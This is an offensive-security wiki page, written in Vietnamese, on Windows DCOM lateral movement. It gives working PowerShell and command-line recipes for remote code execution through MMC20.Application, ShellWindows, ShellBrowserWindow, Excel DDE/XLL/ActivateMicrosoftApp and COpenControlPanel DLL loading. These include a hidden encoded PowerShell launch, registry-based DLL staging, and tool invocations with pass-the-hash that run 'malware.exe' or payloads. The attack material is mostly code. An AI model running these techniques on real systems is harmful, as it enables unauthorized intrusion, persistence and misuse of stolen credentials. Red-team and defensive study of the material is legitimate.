# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement hấp dẫn vì tái sử dụng các COM server hiện có được exposed qua RPC/DCOM thay vì tạo service hoặc scheduled task. Trên thực tế, điều này có nghĩa là kết nối ban đầu thường bắt đầu trên TCP/135 rồi chuyển sang các RPC port cao được gán động.

## Điều kiện tiên quyết & điểm cần lưu ý

- Thông thường, bạn cần có quyền local administrator trên target và COM server từ xa phải cho phép remote launch/activation.
- Kể từ **ngày 14 tháng 3 năm 2023**, Microsoft áp dụng cơ chế hardening DCOM cho các hệ thống được hỗ trợ. Các client cũ yêu cầu activation authentication level thấp có thể gặp lỗi, trừ khi chúng thương lượng được ít nhất `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Các Windows client hiện đại thường tự động nâng mức này, nên các công cụ hiện nay thường vẫn hoạt động.<sup>[[3]](#references)</sup>
- Việc thực thi DCOM thủ công hoặc bằng script thường cần TCP/135 cùng với dynamic RPC port range của target. Nếu dùng Impacket's `dcomexec.py` và muốn nhận lại command output, bạn thường cũng cần quyền truy cập SMB vào `ADMIN$` (hoặc một share khác có thể đọc/ghi).
- Nếu RPC/DCOM hoạt động nhưng SMB bị chặn, `dcomexec.py -nooutput` vẫn có thể hữu ích để thực thi lệnh mà không nhận output.

Các kiểm tra nhanh:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Để biết thêm thông tin về kỹ thuật này, hãy xem [bài viết gốc về MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Các đối tượng Distributed Component Object Model (DCOM) có khả năng thú vị để tương tác với các đối tượng qua mạng. Microsoft cung cấp tài liệu toàn diện về cả DCOM và Component Object Model (COM), có thể truy cập [tại đây về DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) và [tại đây về COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Có thể truy xuất danh sách các ứng dụng DCOM bằng lệnh PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

Đối tượng COM [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) cho phép scripting các thao tác của MMC snap-in. Đáng chú ý, đối tượng này có phương thức `ExecuteShellCommand` trong `Document.ActiveView`. Bạn có thể tìm thêm thông tin về phương thức này [tại đây](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Kiểm tra khi chạy:<sup>[[6]](#references)</sup>

Tính năng này cho phép thực thi lệnh qua mạng thông qua một ứng dụng DCOM. Để tương tác từ xa với DCOM bằng quyền admin, có thể sử dụng PowerShell như sau:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Lệnh này kết nối đến ứng dụng DCOM và trả về một instance của đối tượng COM. Sau đó, có thể gọi phương thức ExecuteShellCommand để thực thi một process trên máy chủ từ xa. Quy trình gồm các bước sau:

Kiểm tra các phương thức:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Đạt RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Đối số cuối cùng là kiểu cửa sổ. `7` giữ cửa sổ ở trạng thái thu nhỏ. Trong thực tế, việc thực thi dựa trên MMC thường khiến tiến trình `mmc.exe` từ xa khởi chạy payload của bạn, khác với các đối tượng dựa trên Explorer bên dưới.

## ShellWindows & ShellBrowserWindow

**Để biết thêm thông tin về kỹ thuật này, hãy xem bài viết gốc [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Đối tượng **MMC20.Application** được ghi nhận là không có giá trị `LaunchPermission` dành riêng cho ứng dụng.<sup>[[2]](#references)</sup> Điều này không tự cấp quyền truy cập: COM kiểm tra ACL `DefaultLaunchPermission` của máy và các hạn chế khởi chạy/truy cập trên toàn máy khi áp dụng.<sup>[[9]](#references)[[10]](#references)</sup> Để biết thêm chi tiết, có thể tham khảo [luồng thảo luận này](https://twitter.com/tiraniddo/status/817532039771525120); đồng thời, nên dùng OleView .NET của [@tiraniddo](https://twitter.com/tiraniddo) để lọc các đối tượng không có Launch Permission được đặt tường minh.

Hai đối tượng cụ thể, `ShellBrowserWindow` và `ShellWindows`, được chú ý vì không có Launch Permissions được đặt tường minh.<sup>[[2]](#references)</sup> Việc không có giá trị `LaunchPermission` bên dưới `HKCR:\AppID\{guid}` có nghĩa là không có ACL khởi chạy dành riêng cho ứng dụng; điều này **không** có nghĩa là kích hoạt từ xa không bị hạn chế.<sup>[[9]](#references)[[10]](#references)</sup>

So với `MMC20.Application`, các đối tượng này thường ít gây chú ý hơn về mặt OPSEC vì lệnh thường trở thành tiến trình con của `explorer.exe` trên máy chủ từ xa, thay vì `mmc.exe`.

### ShellWindows

Với `ShellWindows`, đối tượng không có ProgID, các phương thức .NET `Type.GetTypeFromCLSID` và `Activator.CreateInstance` cho phép khởi tạo đối tượng bằng CLSID của nó. Quá trình này dùng OleView .NET để lấy CLSID của `ShellWindows`. Sau khi khởi tạo, có thể tương tác thông qua phương thức `WindowsShell.Item`, dẫn đến việc gọi phương thức như `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Các lệnh PowerShell ví dụ được cung cấp để khởi tạo đối tượng và thực thi lệnh từ xa:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` tương tự, nhưng bạn có thể khởi tạo trực tiếp qua CLSID của nó và pivot sang `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Di chuyển ngang với các đối tượng DCOM Excel

Có thể thực hiện di chuyển ngang bằng cách khai thác các đối tượng DCOM Excel. Để biết thông tin chi tiết, bạn nên đọc bài viết về cách tận dụng Excel DDE để di chuyển ngang qua DCOM trên [blog của Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Dự án Empire cung cấp một script PowerShell minh họa cách sử dụng Excel để thực thi mã từ xa (RCE) bằng cách thao túng các đối tượng DCOM. Dưới đây là các đoạn trích từ script có trên [kho GitHub của Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), minh họa các phương pháp khác nhau để khai thác Excel nhằm thực thi RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Nghiên cứu gần đây đã mở rộng phạm vi này với phương thức `ActivateMicrosoftApp()` của `Excel.Application`. Ý tưởng chính là Excel có thể tìm cách khởi chạy các ứng dụng Microsoft cũ như FoxPro, Schedule Plus hoặc Project bằng cách tìm kiếm trong `PATH` của hệ thống. Nếu operator có thể đặt payload mang một trong những tên dự kiến đó vào một vị trí có quyền ghi nằm trong `PATH` của mục tiêu, Excel sẽ thực thi payload đó.<sup>[[4]](#references)</sup>

Yêu cầu đối với biến thể này:

- Quyền admin cục bộ trên mục tiêu
- Excel được cài đặt trên mục tiêu
- Có khả năng ghi payload vào một thư mục có quyền ghi trong `PATH` của mục tiêu

Ví dụ thực tế khai thác cơ chế tìm kiếm FoxPro (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Nếu máy chủ tấn công không đăng ký ProgID cục bộ `Excel.Application`, hãy khởi tạo đối tượng từ xa bằng CLSID:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Các giá trị đã được ghi nhận bị lạm dụng trong thực tế:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — tải một DLL Control Panel đã đăng ký

Lớp `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) cung cấp `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Phương thức `Open()` khiến các DLL Control Panel được đăng ký trong khóa `Control Panel\Cpls` được một `dllhost.exe` từ xa tải. Lớp này không có quyền khởi chạy/truy cập tường minh trên các hệ thống đã kiểm thử, vì vậy nó kế thừa chính sách DCOM mặc định (thường yêu cầu quyền quản trị viên để kích hoạt từ xa). Chỉ cần một tên mục bất kỳ là đủ để `Open()` xử lý các DLL đã đăng ký; payload không cần phần mở rộng `.cpl`, nhưng phải là DLL hợp lệ có kiến trúc phù hợp.<sup>[[7]](#references)</sup>

Primitive này dùng cách **stage-and-trigger**, không phải thực thi chỉ bằng lệnh: trước tiên sao chép một DLL lên target và tạo một giá trị `REG_EXPAND_SZ` trỏ đến DLL đó, sau đó kích hoạt đối tượng qua DCOM. Ví dụ, từ ngữ cảnh Windows có quyền quản trị:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Client [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) công khai triển khai lệnh gọi DCOM không được tài liệu hóa bằng Impacket. Chỉ cần cung cấp tên Control Panel item bất kỳ; client vẫn có thể báo lỗi RPC dù `dllhost.exe` đã tải DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Về mặt vận hành, phương thức này cũng cần một kênh ghi tệp và quyền truy cập registry từ xa, nên dễ bị phát hiện hơn `MMC20`/`ShellWindows`. Nó tạo ra một tác dụng phụ duy trì quyền truy cập, vì lần sau mở Control Panel có thể tải lại mục đó. Hãy xóa giá trị sau khi thực thi và tìm các giá trị bất thường trong `Control Panel\Cpls`, đồng thời kiểm tra các DLL được tải bất thường trong `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Công cụ tự động hóa cho Lateral Movement

Hai công cụ được nêu bật để tự động hóa các kỹ thuật này:

- **Invoke-DCOM.ps1**: Script PowerShell do dự án Empire cung cấp, giúp đơn giản hóa việc gọi các phương thức khác nhau để thực thi code trên các máy từ xa. Script này có trong repository GitHub của Empire.

- **SharpLateral**: Công cụ được thiết kế để thực thi code từ xa, có thể sử dụng với lệnh:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Công cụ tự động

- Script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) cho phép dễ dàng gọi tất cả các cách đã được chú thích để thực thi code trên các máy khác.
- Bạn có thể dùng `dcomexec.py` của Impacket để thực thi lệnh trên các hệ thống từ xa bằng DCOM. Các bản build hiện tại hỗ trợ `ShellWindows`, `ShellBrowserWindow` và `MMC20`, đồng thời mặc định dùng `ShellWindows`.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Bạn cũng có thể sử dụng [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Bạn cũng có thể sử dụng [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Di chuyển ngang bằng đối tượng COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Di chuyển ngang qua DCOM: Vòng 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Quản lý các thay đổi đối với lỗ hổng bỏ qua tính năng bảo mật Windows DCOM (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Di chuyển ngang: Khai thác sức mạnh của DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Tận dụng Excel DDE để di chuyển ngang qua DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Lớp MMC Application (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Sử dụng đối tượng DCOM để thực thi lệnh từ xa](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Phụ lục B, Hành vi sản phẩm - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
